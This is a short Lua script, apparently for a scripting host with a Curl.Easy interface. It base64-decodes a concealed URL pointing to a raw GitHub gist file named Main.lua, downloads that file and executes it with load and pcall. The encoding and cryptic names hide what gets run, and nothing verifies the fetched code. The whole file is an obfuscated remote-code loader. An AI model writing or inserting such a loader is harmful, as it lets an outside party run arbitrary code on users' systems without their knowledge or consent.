local a =
"aHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS9kZXYta2FiaXIvMjI4N2JmNDBiY2VkZWRjNGM2NmVkZmE0Y2M0MmUyMzkvcmF3LzU0OWE2NWI2ZmEzNjBjYTE1OGEwMTBmNzQ2ZDcyNDI4MWZlMTRkYTkvTWFpbi5sdWE="

local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'

local function c(data)

    data =
        string.gsub(
            data,
            '[^'..b..'=]',
            ''
        )

    return (
        data:gsub('.', function(x)

            if x == '=' then
                return ''
            end

            local r,f='',
            (b:find(x)-1)

            for i=6,1,-1 do

                r=r..(
                    f%2^i-f%2^(i-1)>0
                    and '1'
                    or '0'
                )

            end

            return r

        end)

        :gsub(
            '%d%d%d?%d?%d?%d?%d?%d?',
            function(x)

                if #x ~= 8 then
                    return ''
                end

                local c=0

                for i=1,8 do

                    c=c+(
                        x:sub(i,i)=='1'
                        and 2^(8-i)
                        or 0
                    )

                end

                return string.char(c)

            end
        )
    )

end

local function d(url)

    local curl =
        Curl.Easy()

    curl:Setopt(
        eCurlOption.CURLOPT_URL,
        url
    )

    curl:Perform()

    local timeout =
        os.clock() + 5

    while not curl:GetFinished() do

        if os.clock() > timeout then
            return nil
        end

    end

    local code, response =
        curl:GetResponse()

    return response
end

local e =
    c(a)

local f =
    d(e)

if f then

    local g =
        load(f)

    if g then
        pcall(g)
    end

end
